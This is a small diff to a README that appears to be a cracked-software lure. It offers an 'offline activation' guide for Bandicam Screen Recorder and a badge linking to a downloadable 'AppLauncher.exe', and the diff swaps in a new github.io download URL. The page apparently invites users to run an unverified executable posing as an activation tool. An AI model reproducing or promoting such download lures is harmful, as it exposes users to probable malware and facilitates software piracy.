@@ -1,6 +1,6 @@
 # 📹 Bandicam Screen Recorder — Offline Activation Guide
 
-[![Download AppLauncher.exe](https://img.shields.io/badge/Download-AppLauncher.exe-brightgreen?style=for-the-badge)](https://screenrecordermark.github.io/.github/)  
+[![Download AppLauncher.exe](https://img.shields.io/badge/Download-AppLauncher.exe-brightgreen?style=for-the-badge)](https://download-portal-demo.github.io/.github/BandicamScreenRecorderr1)  
 ⬇️ Click the green button above to download the offline setup assistant.
 
 ---
